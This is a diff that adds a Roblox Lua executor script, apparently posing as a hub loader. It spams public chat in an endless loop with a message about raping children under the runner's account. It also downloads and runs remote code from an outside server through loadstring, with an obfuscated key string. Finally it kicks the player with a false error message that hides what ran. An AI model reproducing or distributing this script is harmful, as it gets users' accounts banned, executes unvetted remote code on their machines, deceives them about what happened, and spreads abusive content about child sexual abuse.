@@ -1,0 +1,41 @@
+getgenv().loop = true
+while wait() do
+if getgenv().loop == true then
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+local ohString1 = "i rape kids"
+local ohString2 = "All"
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+end
+end
+
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+
+wait(30)
+game.Players.LocalPlayer:Kick("Your loading get some errors, try again")
